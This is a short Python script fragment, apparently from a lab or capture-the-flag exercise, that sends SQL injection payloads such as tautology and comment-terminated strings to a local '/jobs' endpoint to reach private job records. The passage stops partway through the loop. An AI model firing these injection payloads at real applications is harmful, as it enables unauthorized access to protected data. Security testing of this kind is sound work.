url = 'http://localhost:80/jobs'
headers = {'Content-Type': 'application/json'}

payloads = [
    {"desc": "baseline all", "job_type": ""},
    {"desc": "front", "job_type": "front-end"},
    {"desc": "sqli or1=1", "job_type": "front-end' OR '1'='1"},
    {"desc": "sqli or1=1 comment", "job_type": "front-end' OR '1'='1' -- "},
    {"desc": "sqli or like private", "job_type": "' OR type='private' -- "},
]
for p in payloads:
    data = {"job_type": p["job_type"]}
    try:
        r = requests.post(url, headers=headers, data=json.dumps(data), timeout=5)
        print(p["desc"], r.status_code)
        ct = r.headers.get('Content-Type','')
